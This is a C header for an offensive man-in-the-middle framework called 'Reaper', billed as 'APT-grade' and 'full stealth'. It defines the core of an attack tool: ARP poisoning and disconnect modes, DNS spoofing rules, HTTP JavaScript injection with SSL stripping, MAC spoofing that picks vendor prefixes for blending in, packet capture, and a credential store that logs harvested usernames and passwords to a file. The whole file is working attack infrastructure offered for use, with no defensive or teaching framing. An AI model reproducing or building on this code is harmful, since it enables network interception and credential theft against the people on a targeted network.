/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER_CORE.H - SILENT INTERCEPTION ENGINE
 *  APT-Grade MITM Attack Framework Core
 *  
 *  Features:
 *  - MAC spoofing utilities
 *  - Attack mode configuration
 *  - Session state management
 *  - Packet ring buffer for capture
 *  - Credential storage
 *  
 *  Zero Dependencies | Full Stealth | Military Grade
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifndef REAPER_CORE_H
#define REAPER_CORE_H

#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>
#include <time.h>
#include <net/if.h>
#include <netinet/in.h>

/* ═══════════════════════════════════════════════════════════════════════════
 *  ATTACK MODES
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef enum {
    REAPER_MODE_DOS        = 0x01,   // ARP poison only (disconnect target)
    REAPER_MODE_INTERCEPT  = 0x02,   // Full MITM with packet capture
    REAPER_MODE_DNS_SPOOF  = 0x04,   // DNS response injection
    REAPER_MODE_HTTP_INJECT= 0x08,   // HTTP content injection
    REAPER_MODE_HARVEST    = 0x10,   // Credential harvesting
    REAPER_MODE_FULL       = 0xFF    // All modes active
} reaper_mode_t;

typedef enum {
    PROTO_UNKNOWN = 0,
    PROTO_HTTP,
    PROTO_HTTPS,
    PROTO_DNS,
    PROTO_FTP,
    PROTO_TELNET,
    PROTO_SMTP,
    PROTO_POP3,
    PROTO_IMAP,
    PROTO_SSH
} protocol_t;

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAC ADDRESS UTILITIES
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    uint8_t original_mac[6];    // Backed up original MAC
    uint8_t spoofed_mac[6];     // Currently active spoofed MAC
    bool is_spoofed;            // Whether MAC is currently spoofed
    char interface[IFNAMSIZ];   // Interface name
} mac_spoof_state_t;

// Generate random MAC with valid OUI prefix
static inline void reaper_generate_random_mac(uint8_t* mac) {
    // Common vendor OUIs for realism
    static const uint8_t OUIS[][3] = {
        {0x00, 0x1A, 0x2B},  // Generic
        {0x00, 0x50, 0x56},  // VMware (good for blending)
        {0x08, 0x00, 0x27},  // VirtualBox
        {0x00, 0x0C, 0x29},  // VMware
        {0x00, 0x1C, 0x42},  // Parallels
        {0x52, 0x54, 0x00},  // QEMU
        {0xDE, 0xAD, 0xBE},  // Custom (deadbe:xx:xx:xx)
    };
    
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        // Fallback: use time-based
        srand(time(NULL) ^ getpid());
        for (int i = 0; i < 6; i++) mac[i] = rand() & 0xFF;
    } else {
        read(fd, mac, 6);
        close(fd);
    }
    
    // Pick random OUI
    int oui_idx = mac[5] % (sizeof(OUIS) / sizeof(OUIS[0]));
    mac[0] = OUIS[oui_idx][0];
    mac[1] = OUIS[oui_idx][1];
    mac[2] = OUIS[oui_idx][2];
    
    // Ensure unicast (bit 0 of first byte = 0)
    mac[0] &= 0xFE;
    // Set locally administered bit (bit 1 of first byte = 1) for custom MACs
    mac[0] |= 0x02;
}

// Parse MAC from string "XX:XX:XX:XX:XX:XX"
static inline int reaper_parse_mac(const char* str, uint8_t* mac) {
    unsigned int tmp[6];
    if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)tmp[i];
    return 0;
}

// Format MAC to string
static inline void reaper_format_mac(const uint8_t* mac, char* buf, int buflen) {
    snprintf(buf, buflen, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  CAPTURED PACKET STRUCTURE
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_PACKET_SIZE 65536
#define RING_BUFFER_SIZE 256

typedef struct {
    uint32_t timestamp;
    uint16_t length;
    uint16_t protocol;
    uint8_t src_mac[6];
    uint8_t dst_mac[6];
    struct in_addr src_ip;
    struct in_addr dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    uint8_t data[MAX_PACKET_SIZE];
} captured_packet_t;

typedef struct {
    captured_packet_t packets[RING_BUFFER_SIZE];
    volatile int write_idx;
    volatile int read_idx;
    pthread_mutex_t lock;
    volatile int count;
} packet_ring_buffer_t;

static inline void ring_buffer_init(packet_ring_buffer_t* rb) {
    memset(rb, 0, sizeof(*rb));
    pthread_mutex_init(&rb->lock, NULL);
}

static inline void ring_buffer_destroy(packet_ring_buffer_t* rb) {
    pthread_mutex_destroy(&rb->lock);
}

static inline int ring_buffer_push(packet_ring_buffer_t* rb, const captured_packet_t* pkt) {
    pthread_mutex_lock(&rb->lock);
    
    int next = (rb->write_idx + 1) % RING_BUFFER_SIZE;
    if (next == rb->read_idx) {
        pthread_mutex_unlock(&rb->lock);
        return -1;  // Buffer full
    }
    
    memcpy(&rb->packets[rb->write_idx], pkt, sizeof(*pkt));
    rb->write_idx = next;
    rb->count++;
    
    pthread_mutex_unlock(&rb->lock);
    return 0;
}

static inline int ring_buffer_pop(packet_ring_buffer_t* rb, captured_packet_t* pkt) {
    pthread_mutex_lock(&rb->lock);
    
    if (rb->read_idx == rb->write_idx) {
        pthread_mutex_unlock(&rb->lock);
        return -1;  // Buffer empty
    }
    
    memcpy(pkt, &rb->packets[rb->read_idx], sizeof(*pkt));
    rb->read_idx = (rb->read_idx + 1) % RING_BUFFER_SIZE;
    rb->count--;
    
    pthread_mutex_unlock(&rb->lock);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  CREDENTIAL STRUCTURE
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_CRED_LEN 256

typedef struct {
    uint32_t timestamp;
    protocol_t protocol;
    struct in_addr src_ip;
    struct in_addr dst_ip;
    uint16_t dst_port;
    char host[128];
    char username[MAX_CRED_LEN];
    char password[MAX_CRED_LEN];
    char raw_data[512];
} harvested_cred_t;

#define MAX_CREDENTIALS 1024

typedef struct {
    harvested_cred_t creds[MAX_CREDENTIALS];
    int count;
    pthread_mutex_t lock;
    FILE* logfile;
} credential_store_t;

static inline void cred_store_init(credential_store_t* store) {
    memset(store, 0, sizeof(*store));
    pthread_mutex_init(&store->lock, NULL);
}

static inline void cred_store_destroy(credential_store_t* store) {
    if (store->logfile) {
        fclose(store->logfile);
        store->logfile = NULL;
    }
    pthread_mutex_destroy(&store->lock);
}

static inline int cred_store_add(credential_store_t* store, const harvested_cred_t* cred) {
    pthread_mutex_lock(&store->lock);
    
    if (store->count >= MAX_CREDENTIALS) {
        pthread_mutex_unlock(&store->lock);
        return -1;
    }
    
    memcpy(&store->creds[store->count], cred, sizeof(*cred));
    store->count++;
    
    // Log to file if open
    if (store->logfile) {
        char timestamp[32];
        time_t now = time(NULL);
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        
        fprintf(store->logfile, "[%s] %s | %s:%d | User: %s | Pass: %s\n",
                timestamp,
                cred->protocol == PROTO_HTTP ? "HTTP" :
                cred->protocol == PROTO_FTP ? "FTP" :
                cred->protocol == PROTO_TELNET ? "TELNET" :
                cred->protocol == PROTO_SMTP ? "SMTP" : "OTHER",
                cred->host,
                cred->dst_port,
                cred->username,
                cred->password);
        fflush(store->logfile);
    }
    
    pthread_mutex_unlock(&store->lock);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS SPOOFING CONFIGURATION
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_DNS_RULES 64

typedef struct {
    char domain[256];       // Domain to spoof (supports wildcards with *)
    struct in_addr fake_ip; // IP to return
    bool enabled;
} dns_spoof_rule_t;

typedef struct {
    dns_spoof_rule_t rules[MAX_DNS_RULES];
    int count;
    pthread_mutex_t lock;
} dns_spoof_config_t;

static inline void dns_config_init(dns_spoof_config_t* cfg) {
    memset(cfg, 0, sizeof(*cfg));
    pthread_mutex_init(&cfg->lock, NULL);
}

static inline int dns_config_add(dns_spoof_config_t* cfg, const char* domain, struct in_addr ip) {
    pthread_mutex_lock(&cfg->lock);
    
    if (cfg->count >= MAX_DNS_RULES) {
        pthread_mutex_unlock(&cfg->lock);
        return -1;
    }
    
    strncpy(cfg->rules[cfg->count].domain, domain, sizeof(cfg->rules[0].domain) - 1);
    cfg->rules[cfg->count].fake_ip = ip;
    cfg->rules[cfg->count].enabled = true;
    cfg->count++;
    
    pthread_mutex_unlock(&cfg->lock);
    return 0;
}

// Simple wildcard domain matching
static inline bool dns_domain_match(const char* pattern, const char* domain) {
    if (strcmp(pattern, "*") == 0) return true;
    
    // Check for *.example.com pattern
    if (pattern[0] == '*' && pattern[1] == '.') {
        const char* suffix = pattern + 1;  // .example.com
        size_t suffix_len = strlen(suffix);
        size_t domain_len = strlen(domain);
        
        if (domain_len >= suffix_len) {
            return strcmp(domain + domain_len - suffix_len, suffix) == 0;
        }
    }
    
    return strcasecmp(pattern, domain) == 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  HTTP INJECTION CONFIGURATION
 * ═══════════════════════════════════════════════════════════════════════════ */

#define MAX_INJECT_SIZE 4096

typedef struct {
    bool enabled;
    char js_payload[MAX_INJECT_SIZE];       // JavaScript to inject
    char redirect_url[512];                  // Optional redirect URL
    bool strip_https;                        // Attempt SSL stripping
    bool log_requests;                       // Log HTTP requests
} http_inject_config_t;

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAIN REAPER SESSION STATE
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    // Attack state
    volatile int running;
    reaper_mode_t mode;
    
    // Target info
    struct in_addr target_ip;
    struct in_addr gateway_ip;
    uint8_t target_mac[6];
    uint8_t gateway_mac[6];
    
    // Our info
    char interface[IFNAMSIZ];
    uint8_t our_mac[6];
    struct in_addr our_ip;
    
    // MAC spoofing
    mac_spoof_state_t mac_state;
    
    // Sockets
    int arp_sock;
    int capture_sock;
    int inject_sock;
    
    // Threads
    pthread_t poison_thread;
    pthread_t capture_thread;
    pthread_t inject_thread;
    
    // Packet buffer
    packet_ring_buffer_t packet_buffer;
    
    // Credential store
    credential_store_t cred_store;
    
    // DNS spoofing
    dns_spoof_config_t dns_config;
    
    // HTTP injection
    http_inject_config_t http_config;
    
    // Statistics
    uint64_t packets_captured;
    uint64_t packets_injected;
    uint64_t dns_spoofed;
    uint64_t creds_harvested;
    uint64_t arp_packets_sent;
    time_t start_time;
    
} reaper_session_t;

// Global session
extern reaper_session_t* g_reaper_session;

static inline void reaper_session_init(reaper_session_t* session) {
    memset(session, 0, sizeof(*session));
    ring_buffer_init(&session->packet_buffer);
    cred_store_init(&session->cred_store);
    dns_config_init(&session->dns_config);
    session->arp_sock = -1;
    session->capture_sock = -1;
    session->inject_sock = -1;
}

static inline void reaper_session_destroy(reaper_session_t* session) {
    ring_buffer_destroy(&session->packet_buffer);
    cred_store_destroy(&session->cred_store);
    pthread_mutex_destroy(&session->dns_config.lock);
    
    if (session->arp_sock >= 0) close(session->arp_sock);
    if (session->capture_sock >= 0) close(session->capture_sock);
    if (session->inject_sock >= 0) close(session->inject_sock);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  PROTOCOL DETECTION / PORT MAPPING
 * ═══════════════════════════════════════════════════════════════════════════ */

static inline protocol_t detect_protocol(uint16_t port) {
    switch (port) {
        case 80: case 8080: case 8000: case 8888: return PROTO_HTTP;
        case 443: case 8443: return PROTO_HTTPS;
        case 53: return PROTO_DNS;
        case 21: return PROTO_FTP;
        case 23: return PROTO_TELNET;
        case 25: case 587: case 465: return PROTO_SMTP;
        case 110: case 995: return PROTO_POP3;
        case 143: case 993: return PROTO_IMAP;
        case 22: return PROTO_SSH;
        default: return PROTO_UNKNOWN;
    }
}

static inline const char* protocol_to_string(protocol_t proto) {
    switch (proto) {
        case PROTO_HTTP: return "HTTP";
        case PROTO_HTTPS: return "HTTPS";
        case PROTO_DNS: return "DNS";
        case PROTO_FTP: return "FTP";
        case PROTO_TELNET: return "TELNET";
        case PROTO_SMTP: return "SMTP";
        case PROTO_POP3: return "POP3";
        case PROTO_IMAP: return "IMAP";
        case PROTO_SSH: return "SSH";
        default: return "UNKNOWN";
    }
}

#endif // REAPER_CORE_H
